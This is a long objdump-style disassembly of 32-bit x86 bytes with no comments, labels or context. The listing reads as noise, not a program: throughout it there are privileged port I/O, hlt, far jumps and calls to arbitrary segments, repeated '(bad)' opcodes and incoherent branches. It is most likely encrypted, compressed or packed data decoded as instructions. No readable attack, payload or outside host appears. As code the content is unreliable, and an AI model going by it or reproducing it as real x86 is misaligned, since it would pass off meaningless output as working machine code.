  421baa:	jb     0x421bb1
  421bac:	hlt    
  421bad:	test   al,0xd5
  421baf:	mov    bl,0x54
  421bb1:	nop
  421bb2:	xor    ebp,DWORD PTR [edi]
  421bb4:	ins    BYTE PTR es:[edi],dx
  421bb5:	arpl   bx,sp
  421bb7:	xlat   BYTE PTR ds:[ebx]
  421bb8:	in     eax,0x3a
  421bba:	mov    al,BYTE PTR [ecx-0x7b]
  421bbd:	test   ebx,esp
  421bbf:	adc    al,0xad
  421bc1:	hlt    
  421bc2:	jnp    0x421c1e
  421bc4:	jo     0x421be5
  421bc6:	push   ecx
  421bc7:	shl    cl,cl
  421bc9:	jle    0x421b74
  421bcb:	push   es
  421bcc:	mov    ds:0xd418f1c8,eax
  421bd1:	jno    0x421c45
  421bd3:	add    eax,0xc60127e4
  421bd9:	shl    DWORD PTR [eax],1
  421bdb:	mov    cs,WORD PTR [ebx+0x77]
  421bde:	jp     0x421bf7
  421be0:	sbb    esi,DWORD PTR [eax-0x59]
  421be3:	xor    BYTE PTR [edx+0x3d5121b7],dl
  421be9:	loopne 0x421b93
  421beb:	leave  
  421bec:	icebp  
  421bed:	push   0x5958f655
  421bf2:	in     al,0x3e
  421bf4:	test   BYTE PTR [ebx-0x3bc9b08a],cl
  421bfa:	into   
  421bfb:	add    esp,DWORD PTR [ebp+edx*1-0x2f]
  421bff:	xchg   ebx,eax
  421c00:	inc    ebp
  421c01:	lods   al,BYTE PTR ds:[esi]
  421c02:	shr    DWORD PTR [eax+0xe],cl
  421c05:	sub    eax,0xfc4a5ac5
  421c0a:	sti    
  421c0b:	ret    0x5bc8
  421c0e:	cmp    BYTE PTR [edi+0x3b0154d2],dl
  421c14:	inc    BYTE PTR [ecx+eax*4+0x2c1c1fcb]
  421c1b:	sub    DWORD PTR [esi],0xffffffeb
  421c1e:	and    ecx,DWORD PTR [edx+edx*2+0xd]
  421c22:	xchg   ecx,eax
  421c23:	add    eax,0xc5cc7778
  421c28:	jnp    0x421c4e
  421c2a:	and    dh,ah
  421c2c:	push   es
  421c2d:	rcl    dh,cl
  421c2f:	dec    eax
  421c30:	push   ss
  421c31:	outs   dx,DWORD PTR ds:[esi]
  421c32:	sub    DWORD PTR [edi-0x41f087dd],0xbe5c9ceb
  421c3c:	arpl   bp,bx
  421c3e:	int    0x24
  421c40:	cmp    BYTE PTR [ebp+eiz*2-0x5dc78824],dh
  421c47:	add    ah,0x3f
  421c4a:	cmp    bl,bh
  421c4c:	sbb    BYTE PTR [eax],0x4c
  421c4f:	and    edx,DWORD PTR [eax-0x4a]
  421c52:	xor    al,0x57
  421c54:	push   ecx
  421c55:	push   edi
  421c56:	jmp    0x814f:0x3f1c9615
  421c5d:	xor    ah,BYTE PTR [edi+0x11]
  421c60:	mov    ds:0x1ff6949,eax
  421c65:	lea    esp,[edx-0x619c0884]
  421c6b:	loopne 0x421cd2
  421c6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c6e:	retf   0xba5c
  421c71:	(bad)  
  421c73:	cmc    
  421c74:	xlat   BYTE PTR ds:[ebx]
  421c75:	int3   
  421c76:	iret   
  421c77:	mov    ecx,0x39e433e1
  421c7c:	dec    ebx
  421c7d:	imul   esp,DWORD PTR [eax],0xb
  421c80:	ret    
  421c81:	jno    0x421c1a
  421c83:	mov    ds:0x1556478c,al
  421c88:	push   ss
  421c89:	mov    al,0xb3
  421c8b:	xchg   edx,eax
  421c8c:	push   ds
  421c8d:	ficom  WORD PTR [eax+0x3d]
  421c90:	push   es
  421c91:	retf   0x188d
  421c94:	mov    dl,0xde
  421c96:	cwde   
  421c97:	mov    ds:0xd4829240,eax
  421c9c:	stos   DWORD PTR es:[edi],eax
  421c9d:	adc    DWORD PTR [eax],0x833ac23b
  421ca3:	dec    ebp
  421ca4:	cmp    edx,ebx
  421ca6:	jge    0x421c9b
  421ca8:	loopne 0x421c43
  421caa:	push   ecx
  421cab:	cmp    ecx,DWORD PTR [ebx+ebp*2-0x4b]
  421caf:	mov    bl,0xc2
  421cb1:	mov    bh,0xf6
  421cb3:	xor    BYTE PTR [ebp-0x7b],dl
  421cb6:	cmp    esp,ecx
  421cb8:	mov    dh,0xb
  421cba:	xchg   DWORD PTR [ecx+0x31],edx
  421cbd:	xor    eax,0xcf0457cc
  421cc2:	aad    0xf8
  421cc4:	pop    esp
  421cc5:	call   DWORD PTR [ebp-0x26c78155]
  421ccb:	call   0x34b41b62
  421cd0:	(bad)  
  421cd1:	in     al,dx
  421cd2:	ret    0x2338
  421cd5:	jmp    0x421d40
  421cd7:	lds    edx,FWORD PTR [eax+0x5ea7e112]
  421cdd:	mov    eax,ds:0x4437671
  421ce2:	pop    ebx
  421ce3:	mov    ch,0xa5
  421ce5:	pusha  
  421ce6:	sub    ecx,esi
  421ce8:	pop    ds
  421ce9:	sbb    ebx,DWORD PTR [ebx+0x3cc0f0e8]
  421cef:	sub    BYTE PTR [esi+0x2b5f6597],cl
  421cf5:	cmp    cl,cl
  421cf7:	adc    al,0x7b
  421cf9:	mov    dh,0xdd
  421cfb:	stc    
  421cfc:	out    dx,al
  421cfd:	sbb    al,0xb3
  421cff:	rol    BYTE PTR [ebx+ebp*1],cl
  421d02:	cmp    DWORD PTR [ecx+0x169cd9a3],edi
  421d08:	mul    BYTE PTR [ebx]
  421d0a:	mov    esi,0x3c0088fe
  421d0f:	inc    ebp
  421d10:	imul   esi,DWORD PTR [ebp+0x6e57ff4d],0xffffffac
  421d17:	cwde   
  421d18:	or     BYTE PTR [eax-0x5c35f69f],bh
  421d1e:	test   BYTE PTR [eax-0x61],dh
  421d21:	mul    DWORD PTR [esi]
  421d23:	cmp    bl,ah
  421d25:	sar    DWORD PTR [edi+0x75],1
  421d28:	jl     0x421da4
  421d2a:	mov    edx,0x573755d0
  421d2f:	pop    eax
  421d30:	cmp    eax,0x14884156
  421d35:	or     BYTE PTR [eax],dh
  421d37:	outs   dx,BYTE PTR ds:[esi]
  421d38:	int    0xb6
  421d3a:	adc    al,0xc0
  421d3c:	dec    edi
  421d3d:	sbb    al,0x28
  421d3f:	inc    edi
  421d40:	stc    
  421d41:	aaa    
  421d42:	fldenv [si]
  421d45:	mov    bl,0x5
  421d47:	stos   BYTE PTR es:[edi],al
  421d48:	pop    ds
  421d49:	push   edx
  421d4a:	not    DWORD PTR [ecx]
  421d4c:	push   edi
  421d4d:	mov    edx,0x1ba07738
  421d52:	push   esp
  421d53:	mul    bh
  421d55:	jnp    0x421dad
  421d57:	call   0xe59c:0x4eb0ddd9
  421d5e:	repnz and ebp,DWORD PTR [ecx]
  421d61:	rcl    ebx,0x13
  421d64:	cmp    DWORD PTR ds:0xf1c5e5ad,0x114834be
  421d6e:	mov    es,ebp
  421d70:	or     ebp,DWORD PTR ss:[edx]
  421d73:	sbb    DWORD PTR [ebx-0x1009a3a9],esi
  421d79:	or     edx,DWORD PTR [ebp-0x6e6f2564]
  421d7f:	pop    edx
  421d80:	add    al,0x15
  421d82:	sub    al,BYTE PTR [ecx+0x3c]
  421d85:	cdq    
  421d86:	sbb    al,0x30
  421d88:	xchg   ebx,eax
  421d89:	lahf   
  421d8a:	mov    edx,0xe5c88249
  421d8f:	xchg   BYTE PTR [edi-0x6f],dl
  421d92:	dec    esp
  421d93:	or     esi,DWORD PTR [edi+esi*4+0x12]
  421d97:	add    al,0xd1
  421d99:	es retf 0xd727
  421d9d:	popf   
  421d9e:	adc    edx,DWORD PTR [ecx+0x6c]
  421da1:	aaa    
  421da2:	xchg   BYTE PTR ds:0x47ab60fa,bl
  421da8:	mov    ebx,0x473463e
  421dad:	mov    cl,0x43
  421daf:	in     al,dx
  421db0:	shr    DWORD PTR [eax+0x7105aaa2],cl
  421db6:	sub    al,0x32
  421db8:	ret    
  421db9:	adc    dl,0x44
  421dbc:	pop    esi
  421dbd:	daa    
  421dbe:	call   0x42eac32c
  421dc3:	sti    
  421dc4:	push   0x6d2c9527
  421dc9:	mov    dl,0x55
  421dcb:	lahf   
  421dcc:	sbb    al,0x9
  421dce:	nop
  421dcf:	and    DWORD PTR [eax+0x6f],esi
  421dd2:	or     BYTE PTR [ebp+0x6ab585c9],0x5d
  421dd9:	arpl   WORD PTR [bp+0x625a],bp
  421dde:	arpl   WORD PTR ds:0x8725d847,sp
  421de4:	out    0x1a,eax
  421de6:	pop    ecx
  421de7:	adc    cl,BYTE PTR [ebx+ecx*8]
  421dea:	out    0xff,al
  421dec:	dec    DWORD PTR [ebx]
  421dee:	xor    ebp,DWORD PTR [edi+0x47f7094c]
  421df4:	ret    0xe829
  421df7:	stc    
  421df8:	pusha  
  421df9:	push   cs
  421dfa:	push   ds
  421dfb:	mov    ds:0xefb76a8,al
  421e00:	pusha  
  421e01:	clc    
  421e02:	jge    0x421e2a
  421e04:	adc    BYTE PTR [eax-0x64],bh
  421e07:	in     al,0xd5
  421e09:	mov    al,ds:0xf14a758f
  421e0e:	in     eax,dx
  421e0f:	(bad)  
  421e10:	mov    edi,0x36f82a38
  421e15:	ret    
  421e16:	dec    ebp
  421e17:	sub    DWORD PTR [esi-0x7cc0fd6f],esp
  421e1d:	or     eax,0x7837d870
  421e22:	fistp  DWORD PTR [edx]
  421e24:	mov    ebp,0x9704bb0c
  421e29:	sbb    edi,DWORD PTR [ebp+0x4]
  421e2c:	shr    DWORD PTR [ebp-0x6a],0x96
  421e30:	(bad)  
  421e31:	sahf   
  421e32:	and    cl,BYTE PTR [edx+0x57]
  421e35:	lds    ebp,FWORD PTR [edi+0x46]
  421e38:	(bad)  
  421e3a:	ins    DWORD PTR es:[edi],dx
  421e3b:	lds    ax,DWORD PTR [ebx]
  421e3e:	jecxz  0x421e88
  421e40:	and    ebp,ebp
  421e42:	mov    ebp,0xb7db46d3
  421e47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e48:	sub    eax,ebx
  421e4a:	jle    0x421ec7
  421e4c:	les    esp,FWORD PTR [esi-0x1cf75d99]
  421e52:	push   edx
  421e53:	dec    ecx
  421e54:	xchg   ebp,eax
  421e55:	mov    WORD PTR cs:[eax+0x1a],cs
  421e59:	fwait
  421e5a:	daa    
  421e5b:	pop    ebx
  421e5c:	xor    ecx,DWORD PTR [edx]
  421e5e:	sub    eax,0xca7d12c5
  421e63:	fnstenv [ebx+0xc]
  421e66:	xor    BYTE PTR [edx],dh
  421e68:	and    DWORD PTR [ebx],ebx
  421e6a:	rcl    DWORD PTR [ebx],0x55
  421e6d:	pop    ebx
  421e6e:	or     edx,eax
  421e70:	mov    ebx,0x6cabbee6
  421e75:	xchg   edx,eax
  421e76:	gs inc edx
  421e78:	jbe    0x421e2f
  421e7a:	(bad)  
  421e7b:	xchg   ebp,eax
  421e7c:	xor    ebp,eax
  421e7e:	(bad)  
  421e7f:	data16 sub al,BYTE PTR [edi]
  421e82:	out    0xe,eax
  421e84:	out    0xc7,eax
  421e86:	push   ss
  421e87:	sbb    eax,0x4b3fb608
  421e8c:	push   ds
  421e8d:	sub    DWORD PTR [ebx+0x3d],eax
  421e90:	dec    eax
  421e91:	adc    al,0x30
  421e93:	(bad)  
  421e94:	fnstenv [ebx-0x36]
  421e97:	test   eax,0x5e8bbb6c
  421e9c:	mov    DWORD PTR ds:0xa1b84a9e,edx
  421ea2:	fistp  DWORD PTR [ebx-0x67]
  421ea5:	jle    0x421e6a
  421ea7:	inc    esi
  421ea8:	loop   0x421e58
  421eaa:	retf   0xd522
  421ead:	xor    ebp,DWORD PTR [ebx+0xd24c0da]
  421eb3:	and    BYTE PTR ds:0x6fc7dc3,dl
  421eb9:	xchg   esp,eax
  421eba:	add    bl,BYTE PTR [ebp+0x5]
  421ebd:	dec    eax
  421ebe:	mov    ecx,0x431e8a94
  421ec3:	mov    eax,ds:0x8636e55a
  421ec8:	cld    
  421ec9:	inc    esi
  421eca:	data16 mov ds:0xca9936ab,al
  421ed0:	aas    
  421ed1:	or     al,0x71
  421ed3:	je     0x421e7b
  421ed5:	cld    
  421ed6:	fcomp  DWORD PTR [ebx+0x2a2ad5b9]
  421edc:	mov    dh,0x22
  421ede:	dec    ecx
  421edf:	inc    esi
  421ee0:	(bad)  
  421ee1:	loope  0x421f40
  421ee3:	lods   al,BYTE PTR ds:[esi]
  421ee4:	popa   
  421ee5:	and    al,0x65
  421ee7:	iret   
  421ee8:	into   
  421ee9:	dec    edx
  421eea:	dec    ebx
  421eeb:	and    cl,dl
  421eed:	stos   BYTE PTR es:[edi],al
  421eee:	dec    ecx
  421eef:	push   edi
  421ef0:	adc    al,0x60
  421ef2:	sub    eax,0xa2eef233
  421ef7:	push   es
  421ef8:	sar    BYTE PTR [ecx],1
  421efa:	int3   
  421efb:	fwait
  421efc:	and    dl,BYTE PTR [edx-0x6fb391de]
  421f02:	and    al,0x69
  421f04:	and    ebp,ebx
  421f06:	adc    al,0xc7
  421f08:	add    eax,DWORD PTR es:[eax+0x70]
  421f0c:	mov    ebp,ds
  421f0e:	adc    cl,BYTE PTR [ecx-0x2a1cc138]
  421f14:	mov    edx,0xe1ed1c2c
  421f19:	lods   al,BYTE PTR ds:[esi]
  421f1a:	adc    BYTE PTR [ebx+eiz*4],ah
  421f1d:	(bad)  
  421f1f:	pop    esp
  421f20:	jmp    0xe5572913
  421f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421f26:	mov    WORD PTR [ecx-0x5c48bafb],ss
  421f2c:	push   ebx
  421f2d:	fs scas eax,DWORD PTR es:[edi]
  421f2f:	or     DWORD PTR [ecx],esi
  421f31:	stos   DWORD PTR es:[edi],eax
  421f32:	sbb    eax,edx
  421f34:	or     al,0xc9
  421f36:	ror    BYTE PTR [eax+0x6dab6d3d],0x4b
  421f3d:	jbe    0x421f97
  421f3f:	sub    al,0x91
  421f41:	enter  0x2e2,0xe
  421f45:	fdivr  DWORD PTR [edi]
  421f47:	add    ebp,DWORD PTR [eax-0x58]
  421f4a:	dec    esi
  421f4b:	test   al,0xc0
  421f4d:	mov    cl,0x40
  421f4f:	mov    ebp,0xc2557319
  421f54:	jecxz  0x421ef7
  421f56:	dec    ecx
  421f57:	loopne 0x421f9a
  421f59:	mov    ebp,edi
  421f5b:	add    eax,0x726ffa48
  421f60:	sub    DWORD PTR [ebx+0x1f],eax
  421f63:	inc    eax
  421f64:	mov    al,ds:0x446c513b
  421f69:	test   al,0xbb
  421f6b:	iret   
  421f6c:	in     eax,0x9a
  421f6e:	in     eax,0xd2
  421f70:	fisubr DWORD PTR [ebp-0x443b6d54]
  421f76:	into   
  421f77:	or     BYTE PTR [edi],ah
  421f79:	xlat   BYTE PTR ds:[ebx]
  421f7a:	jne    0x421f7c
  421f7c:	xor    eax,0xb63baa73
  421f81:	test   eax,0x4ef49170
  421f86:	loope  0x421f2e
  421f88:	jne    0x421feb
  421f8a:	mov    bh,BYTE PTR [eax+edi*8-0x18]
  421f8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f8f:	xor    dh,0x12
  421f92:	pop    edi
  421f93:	das    
  421f94:	imul   ecx,DWORD PTR [esi-0x12d3e1a5],0x9ac80f0f
  421f9e:	push   ebp
  421f9f:	out    0xc8,eax
  421fa1:	dec    edi
  421fa2:	scas   al,BYTE PTR es:[edi]
  421fa3:	pushf  
  421fa4:	call   0x6614:0xb541d9c0
  421fab:	jge    0x421f59
  421fad:	outs   dx,DWORD PTR ds:[esi]
  421fae:	int    0xc1
  421fb0:	stos   DWORD PTR es:[edi],eax
  421fb1:	(bad)  
  421fb2:	jbe    0x422008
  421fb4:	fnstsw WORD PTR [ebx]
  421fb6:	mov    edx,0x35d94907
  421fbb:	jle    0x421f8c
  421fbd:	inc    ebx
  421fbe:	add    eax,0x50abfd0b
  421fc3:	dec    ebp
  421fc4:	sbb    dh,ah
  421fc6:	jo     0x421f9f
  421fc8:	adc    eax,0x7c30cc6b
  421fcd:	sbb    BYTE PTR [eax+0x1844b9bb],ah
  421fd3:	fist   DWORD PTR [eax+0xb]
  421fd6:	add    eax,0x4b186827
  421fdb:	repnz mov dl,BYTE PTR [ebx+0x17]
  421fdf:	das    
  421fe0:	push   cs
  421fe1:	das    
  421fe2:	cdq    
  421fe3:	xchg   edi,eax
  421fe4:	and    eax,0x18f2f5fd
  421fe9:	cwde   
  421fea:	inc    ecx
  421feb:	shl    ch,1
  421fed:	mov    WORD PTR [edi+0x46aa9993],ds
  421ff3:	pop    eax
  421ff4:	shr    BYTE PTR [esi],0x36
  421ff7:	mov    esi,0x2a60d88f
  421ffc:	into   
  421ffd:	in     al,dx
  421ffe:	mov    ebx,0x3460f3e1
  422003:	adc    DWORD PTR [edx+0x1057ae1e],edi
  422009:	inc    ebx
  42200a:	js     0x421ffd
  42200c:	lock xlat BYTE PTR ds:[ebx]
  42200e:	inc    esi
  42200f:	jns    0x422075
  422011:	sbb    eax,0x3dfb630d
  422016:	push   edi
  422017:	fdiv   st(5),st
  422019:	retf   0x89af
  42201c:	mov    cl,ah
  42201e:	ficomp WORD PTR [ecx-0x5bfcbbdc]
  422024:	daa    
  422025:	cmp    ch,dh
  422027:	push   eax
  422028:	jo     0x422078
  42202a:	adc    BYTE PTR [edx-0x42],ah
  42202d:	aas    
  42202e:	popf   
  42202f:	cmc    
  422030:	mov    bh,0x9d
  422032:	sbb    eax,0x6a100fe5
  422037:	fsubp  st(3),st
  422039:	xchg   edx,eax
  42203a:	in     eax,0x85
  42203c:	pop    ds
  42203d:	pop    ds
  42203e:	aad    0x1a
  422040:	pop    ecx
  422041:	lods   al,BYTE PTR ds:[esi]
  422042:	test   eax,0x99328111
  422047:	inc    ebp
  422048:	in     al,0x42
  42204a:	pop    esi
  42204b:	hlt    
  42204c:	xor    edi,eax
  42204e:	sub    dl,BYTE PTR [ebp+0x44f7a1d6]
  422054:	iret   
  422055:	jg     0x42206a
  422057:	mov    bh,0xe0
  422059:	cmp    esp,edi
  42205b:	xor    eax,0xa825b7d5
  422060:	mov    esp,0xa737ea74
  422065:	push   cs
  422066:	adc    BYTE PTR [edx+0x3028e4d],ah
  42206c:	repz adc al,0x3a
  42206f:	xchg   edi,eax
  422070:	pop    ds
  422071:	mov    edx,0x65331d86
  422076:	add    al,0xf0
  422078:	jg     0x422025
  42207a:	adc    al,0x44
  42207c:	out    0xc1,al
  42207e:	pop    ds
  42207f:	imul   ecx,eax,0xffffffba
  422082:	scas   eax,DWORD PTR es:[edi]
  422083:	jmp    0x74a:0xb3095e3f
  42208a:	and    DWORD PTR [bx+0x35],0xf7d9b43b
  422092:	xchg   edi,eax
  422093:	mov    ch,0xe0
  422095:	fst    DWORD PTR [edi]
  422097:	mov    ch,0xb3
  422099:	jp     0x42210f
  42209b:	dec    esi
  42209c:	push   ebp
  42209d:	imul   esi,DWORD PTR [ecx],0x873c1065
  4220a3:	stos   BYTE PTR es:[edi],al
  4220a4:	mov    al,ds:0xca5859ce
  4220a9:	mov    ds:0xd5e24bb9,al
  4220ae:	aas    
  4220af:	pusha  
  4220b0:	xchg   ebx,eax
  4220b1:	xlat   BYTE PTR ds:[ebx]
  4220b2:	mov    ah,0xde
  4220b4:	inc    esp
  4220b5:	scas   eax,DWORD PTR es:[edi]
  4220b6:	push   eax
  4220b7:	push   edx
  4220b8:	out    dx,al
  4220b9:	mov    dh,0xf
  4220bb:	push   es
  4220bc:	call   0xeb2c:0x82d4cb49
  4220c3:	sbb    eax,0x3516d03d
  4220c8:	cmp    dl,BYTE PTR [esp+edx*4-0x59]
  4220cc:	xor    ah,bl
  4220ce:	jg     0x4220e8
  4220d0:	mov    eax,ds:0x338d3e32
  4220d5:	mov    edi,0x8f7a285
  4220da:	stc    
  4220db:	repz mov eax,ds:0x572c4ce6
  4220e1:	icebp  
  4220e2:	ret    0x1352
  4220e5:	nop
  4220e6:	je     0x42209e
  4220e8:	sahf   
  4220e9:	js     0x422145
  4220eb:	test   BYTE PTR [edx],0x97
  4220ee:	cdq    
  4220ef:	or     DWORD PTR [eax-0x1],ebp
  4220f2:	xor    ah,BYTE PTR [esi+0x2bf144b7]
  4220f8:	ins    BYTE PTR es:[edi],dx
  4220f9:	scas   al,BYTE PTR es:[edi]
  4220fa:	adc    BYTE PTR [ecx+0x31],al
  4220fd:	loope  0x42214b
  4220ff:	call   0xcf22:0xfebad054
  422106:	addr16 mov edx,0xf13f26d0
  42210c:	cmp    al,0x41
  42210e:	xchg   BYTE PTR [edi+0x28],bh
  422111:	gs js  0x4220aa
  422114:	div    DWORD PTR [ecx]
  422116:	call   0x4b7b:0x25fca31a
  42211d:	pop    ebp
  42211e:	call   0xb6da51e4
  422123:	imul   esi,DWORD PTR [esi-0x642d087],0x2dcd3bc1
  42212d:	xor    al,0xf9
  42212f:	inc    ebp
  422130:	popf   
  422131:	xor    eax,0x22bcbef3
  422136:	jnp    0x4220c4
  422138:	test   esp,edi
  42213a:	fwait
  42213b:	push   edi
  42213c:	inc    edx
  42213d:	je     0x4221b7
  42213f:	pop    eax
  422140:	fmul   st(4),st
  422142:	add    al,0xc3
  422144:	mov    cl,0xd
  422146:	ret    
  422147:	out    0xfa,al
  422149:	dec    edi
  42214a:	arpl   WORD PTR ds:0x6c55838d,di
  422150:	out    dx,al
  422151:	jmp    0x53585e37
  422156:	aaa    
  422157:	popf   
  422158:	inc    esp
  422159:	pop    ds
  42215a:	pop    ecx
  42215b:	inc    esp
  42215c:	imul   al
  42215e:	mov    eax,0x292fc223
  422163:	cdq    
  422164:	fdivrp st(6),st
  422166:	jne    0x4221bd
  422168:	std    
  422169:	pop    edi
  42216a:	iret   
  42216b:	and    ah,cl
  42216d:	cwde   
  42216e:	inc    BYTE PTR [ebx-0x5d]
  422171:	inc    edx
  422172:	(bad)  
  422173:	(bad)  
  422174:	imul   edx,DWORD PTR [ebx+0x144dacd1],0x4a29cc8f
  42217e:	mov    dl,0xfa
  422180:	xor    al,0xd0
  422182:	pop    ds
  422183:	jno    0x422203
  422185:	cdq    
  422186:	loop   0x422176
  422188:	scas   al,BYTE PTR es:[edi]
  422189:	stos   DWORD PTR es:[edi],eax
  42218a:	sub    edx,DWORD PTR [edx+0x79]
  42218d:	mov    ecx,eax
  42218f:	mov    bh,0xc4
  422191:	adc    eax,DWORD PTR [edi-0x19]
  422194:	addr16 and edx,edx
  422197:	sbb    BYTE PTR [edx+0x1e],al
  42219a:	xlat   BYTE PTR ds:[ebx]
  42219b:	sbb    bl,BYTE PTR [ebx+0x18]
  42219e:	cmp    DWORD PTR [edi+0x6c],ebp
  4221a1:	cmp    ebp,DWORD PTR [ecx+0x21437b35]
  4221a7:	gs je  0x422137
  4221aa:	pop    esi
  4221ab:	out    dx,eax
  4221ac:	and    ch,BYTE PTR [esi]
  4221ae:	mov    ebx,0xef7fe298
  4221b3:	jmp    esp
  4221b5:	call   0x7b31:0x9f1dde0e
  4221bc:	xor    bh,BYTE PTR [edi-0x23d6b1d6]
  4221c2:	out    0xf5,eax
  4221c4:	jp     0x422221
  4221c6:	retf   0x1676
  4221c9:	push   eax
  4221ca:	cmp    DWORD PTR [eax+ecx*2],0x3b
  4221ce:	jg     0x422189
  4221d0:	gs xchg esi,eax
  4221d2:	push   ebx
  4221d3:	inc    esi
  4221d4:	test   eax,0xf60f10cf
  4221d9:	mov    al,ds:0xdf413d49
  4221de:	ins    BYTE PTR es:[edi],dx
  4221df:	jmp    0x1c60:0x2253aee5
  4221e6:	cs out dx,eax
  4221e8:	sub    al,0x4e
  4221ea:	ins    BYTE PTR es:[edi],dx
  4221eb:	push   edx
  4221ec:	jl     0x4221a6
  4221ee:	test   DWORD PTR [esi+0x66],eax
  4221f1:	pop    eax
  4221f2:	mov    al,ds:0xd8914369
  4221f7:	xchg   esp,eax
  4221f8:	mov    BYTE PTR [esi],cl
  4221fa:	xchg   edi,eax
  4221fb:	js     0x422253
  4221fd:	push   0x61d367be
  422202:	enter  0xa04d,0x55
  422206:	int    0x53
  422208:	dec    esp
  422209:	ins    BYTE PTR es:[edi],dx
  42220a:	scas   al,BYTE PTR es:[edi]
  42220b:	jbe    0x422256
  42220d:	aad    0xff
  42220f:	sub    DWORD PTR [eax],edx
  422211:	and    cl,BYTE PTR [ebp-0x18]
  422214:	sbb    DWORD PTR ds:0x423e7914,ebx
  42221a:	jae    0x422245
  42221c:	mov    bh,0x51
  42221e:	mov    eax,DWORD PTR [ecx]
  422220:	mov    ecx,0x6d242b07
  422225:	jae    0x422237
  422227:	xor    BYTE PTR [eax+0xd717eed],bh
  42222d:	push   0xffffff9f
  42222f:	das    
  422230:	adc    al,0xe4
  422232:	jge    0x42229e
  422234:	mov    dh,0xe9
  422236:	(bad)  
  422237:	ret    0xd322
  42223a:	cld    
  42223b:	mov    edi,0x1720b89e
  422240:	xchg   esi,eax
  422241:	sub    al,0x76
  422243:	or     DWORD PTR [edx+0x5cc86600],0xb05412c9
  42224d:	imul   edi,DWORD PTR [edi-0x67061c54],0xc2bd8dd8
  422257:	cs or  ch,ch
  42225a:	call   0x67f:0x15080154
  422261:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422262:	jne    0x4221ee
  422264:	or     ecx,DWORD PTR [ebp+0x6e]
  422267:	arpl   sp,di
  422269:	nop
  42226a:	dec    ebp
  42226b:	jecxz  0x422257
  42226d:	and    al,0x1a
  42226f:	rol    BYTE PTR [ecx+0x158c944e],cl
  422275:	mov    ah,0x26
  422277:	xlat   BYTE PTR ds:[ebx]
  422278:	jbe    0x4222ac
  42227a:	dec    ebx
  42227b:	xchg   ebx,eax
  42227c:	ror    edi,cl
  42227e:	fdivr  QWORD PTR [edx]
  422280:	out    dx,eax
  422281:	xor    edx,DWORD PTR [edi+0x156f9bd4]
  422287:	add    al,0x77
  422289:	test   eax,0x8f048d
  42228e:	fsub   st(4),st
  422290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422291:	leave  
  422292:	clc    
  422293:	xchg   esi,eax
  422294:	les    ecx,FWORD PTR [ebx+0x70]
  422297:	sbb    DWORD PTR [ebx+ecx*2+0x5b459aa3],0xffffffdf
  42229f:	jecxz  0x4222fd
  4222a1:	cmp    dh,BYTE PTR [ebp+0x1]
  4222a4:	mov    dl,0x43
  4222a6:	xchg   edx,eax
  4222a7:	outs   dx,DWORD PTR ds:[esi]
  4222a8:	inc    edx
  4222a9:	aam    0x62
  4222ab:	mov    dl,0x4d
  4222ad:	sbb    dl,BYTE PTR ds:0xe85f784c
  4222b3:	out    dx,al
  4222b4:	into   
  4222b5:	inc    edx
  4222b6:	in     eax,0x94
  4222b8:	inc    edx
  4222b9:	dec    eax
  4222ba:	outs   dx,BYTE PTR ds:[esi]
  4222bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4222bc:	xor    ah,BYTE PTR [ecx]
  4222be:	ins    BYTE PTR es:[edi],dx
  4222bf:	inc    esp
  4222c0:	or     eax,0x53394f89
  4222c5:	add    eax,0xd830021a
  4222ca:	ror    BYTE PTR [edi+edi*4+0x75],0x97
  4222cf:	in     al,dx
  4222d0:	mov    ?,WORD PTR [edi-0x6]
  4222d3:	scas   eax,DWORD PTR es:[edi]
  4222d4:	fwait
  4222d5:	inc    edi
  4222d6:	call   0x97cf8442
  4222db:	or     bh,0xf7
  4222de:	pop    edi
  4222df:	aam    0xe9
  4222e1:	push   ecx
  4222e2:	(bad)  
  4222e3:	repz jns 0x422269
  4222e6:	dec    eax
  4222e7:	adc    dh,BYTE PTR [ecx+0x6]
  4222ea:	hlt    
  4222eb:	je     0x4222f5
  4222ed:	pop    ebx
  4222ee:	(bad)  
  4222ef:	popa   
  4222f0:	cmp    al,0x67
  4222f2:	sbb    DWORD PTR [ebx+0x8],ebx
  4222f5:	shl    BYTE PTR [eax],1
  4222f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4222f8:	push   ebx
  4222f9:	cld    
  4222fa:	pmaxsw mm6,QWORD PTR [eax]
  4222fd:	js     0x4222df
  4222ff:	cmc    
  422300:	shl    BYTE PTR [edi],1
  422302:	adc    bh,BYTE PTR [edx]
  422304:	xchg   ecx,eax
  422305:	rol    edx,1
  422307:	xor    al,0x82
  422309:	and    ebx,ebx
  42230b:	in     eax,dx
  42230c:	push   ss
  42230d:	xor    eax,0xa3184b67
  422312:	test   DWORD PTR [edx-0x1b],edi
  422315:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422316:	mov    DWORD PTR [ebp-0x9],ecx
  422319:	or     ch,ch
  42231b:	aas    
  42231c:	mov    DWORD PTR [ecx-0x1c],ebx
  42231f:	ins    BYTE PTR es:[edi],dx
  422320:	inc    esp
  422321:	sahf   
  422322:	pop    esi
  422323:	hlt    
  422324:	in     eax,0x5
  422326:	inc    eax
  422327:	jmp    0x3fd4812f
  42232c:	sub    eax,0x8fcfc445
  422331:	je     0x422369
  422333:	cmp    al,0x70
  422335:	lods   al,BYTE PTR ds:[esi]
  422336:	pusha  
  422337:	sar    BYTE PTR [esi],0x85
  42233a:	test   DWORD PTR ds:0x9a9e6c40,ebx
  422340:	xchg   ebp,eax
  422341:	lea    ebx,[esi]
  422343:	push   ebx
  422344:	add    WORD PTR [bx+si],bp
  422348:	cmp    eax,DWORD PTR [edx]
  42234a:	sub    BYTE PTR [ebx-0x5],0x89
  42234e:	dec    ebp
  42234f:	jmp    0x4223ce
  422351:	jmp    DWORD PTR [eax+ecx*8+0x7fbbbdec]
  422358:	clc    
  422359:	pop    ss
  42235a:	add    BYTE PTR [eax],dl
  42235c:	loop   0x4222e7
  42235e:	jmp    0x2c3af54
  422363:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422364:	xor    al,0xef
  422366:	mov    ah,BYTE PTR [ebp-0x4a2de146]
  42236c:	or     esi,DWORD PTR ds:0x2c2dfab6
